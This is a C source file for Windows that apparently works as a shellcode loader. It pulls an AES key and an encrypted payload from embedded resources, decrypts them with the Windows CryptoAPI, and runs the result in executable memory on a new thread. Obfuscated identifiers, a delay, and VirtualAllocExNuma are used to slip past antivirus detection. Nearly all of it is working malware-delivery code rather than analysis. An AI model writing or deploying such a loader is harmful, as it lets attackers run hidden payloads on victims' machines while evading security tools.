#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")

// Function to load resource data into memory
void loadkumres(const char* ressus, unsigned char** data, DWORD* size) {
    HMODULE hModule = GetModuleHandle(NULL);
    HRSRC hResource = FindResource(hModule, ressus, RT_RCDATA);
    

    HGLOBAL hResData = LoadResource(hModule, hResource);
    *size = SizeofResource(hModule, hResource);
    *data = (unsigned char*)LockResource(hResData);
}

// Function to decrypt AES encrypted shellcode
void aeaesdecokaes(char* codekumaa, DWORD codekumaaLen, char* keydude1299, DWORD keydude1299Len) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    CryptHashData(hHash, (BYTE*)keydude1299, keydude1299Len, 0);
    CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
    CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)codekumaa, &codekumaaLen);

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

}


int main() {
  

    char* kkeyakesey;
    DWORD kkeyakeseyLen;
    loadkumres("dhanushkey1", &kkeyakesey, &kkeyakeseyLen);

    char* kkcode;
    DWORD kkcodeLen;
    loadkumres("dhanushcode56", &kkcode, &kkcodeLen);

    // Print the AES key and shellcode for debugging (as hex)
     unsigned char karik12y[kkeyakeseyLen];
    unsigned char karic0d2[kkcodeLen];

   
    memcpy(karik12y, kkeyakesey, kkeyakeseyLen);
    memcpy(karic0d2, kkcode, kkcodeLen);

   

    LPVOID coohsllo = VirtualAllocExNuma(GetCurrentProcess(), NULL, kkcodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0xFFFFFFFF);
    Sleep(1000);
    aeaesdecokaes((char*)karic0d2, sizeof(karic0d2), karik12y, sizeof(karik12y));  // Decrypt AES shellcode

    memcpy(coohsllo, karic0d2, sizeof(karic0d2));  // Copy decrypted shellcode to allocated memory
    DWORD oldProtect;
    VirtualProtect(coohsllo, sizeof(karic0d2), PAGE_EXECUTE_READ, &oldProtect);  // Change protection to execute

    HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)coohsllo, NULL, 0, NULL);  // Execute shellcode in a new thread
    WaitForSingleObject(tHandle, INFINITE);  // Wait for thread to finish

    return 0;
}
